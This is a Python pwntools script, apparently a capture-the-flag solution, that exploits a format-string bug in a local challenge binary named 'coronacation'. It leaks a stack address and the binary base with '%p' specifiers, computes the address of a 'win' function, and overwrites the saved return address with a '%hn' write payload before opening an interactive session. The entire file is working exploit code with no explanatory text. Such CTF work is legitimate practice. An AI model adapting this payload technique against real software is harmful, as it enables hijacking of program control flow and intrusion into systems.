from pwn import *


win_offset = 0x01165
puts_got_offset = 0x03fb8
start_offset = 0x1080

# context.log_level='debug'

p = process('./coronacation')

# gdb.attach(p, """
# b *play_game+121
# b *close_borders+109
# b *close_borders+114
# """)

p.sendlineafter('out.\n', b'1 %14$p%13$p')

p.recvuntil('You chose: 1 0x')
res = p.recvuntil('0x')[:-2]
log.info(res)

rbp_addr = int(res, 16) - 0x10
ret_addr = rbp_addr - 0x48

res = p.recvuntil('\n')[:-1]
log.info(res)
base_addr = int(res, 16) - start_offset
win_addr = base_addr + win_offset

log.info(f'rbp_addr : {hex(rbp_addr)}')
log.info(f'ret_addr : {hex(ret_addr)}')
log.info(f'win_addr : {hex(win_addr)}')

payload = b'%' + str(win_addr & 0xffff).encode() + b'c%11$hn'
payload = payload.ljust(0x28, b'a')
payload += p64(ret_addr)

p.sendlineafter('plan.\n', payload)
p.interactive()
